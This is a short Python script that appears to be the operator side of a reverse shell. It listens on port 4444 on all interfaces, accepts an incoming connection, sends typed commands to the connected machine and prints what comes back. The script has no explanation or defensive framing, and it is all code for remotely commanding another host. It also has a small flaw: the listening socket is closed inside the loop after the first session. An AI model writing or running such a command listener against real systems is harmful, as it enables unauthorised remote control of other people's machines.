import socket

listen_ip= "0.0.0.0"
listen_port= 4444

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((listen_ip, listen_port))
s.listen(1)

print(f"[+] Listening for incoming connections on {listen_ip}:{listen_port}")

while True:
    client_socket, address = s.accept()
    print(f"[+] Accepted connection from {address[0]}:{address[1]}")

    while True:
        cmd = input("> ")      
        
        if cmd.lower() =="exit":
            break
        client_socket.send(cmd.encode())   
        output = client_socket.recv(1024).decode()      
        print(output)
    client_socket.close()
    s.close()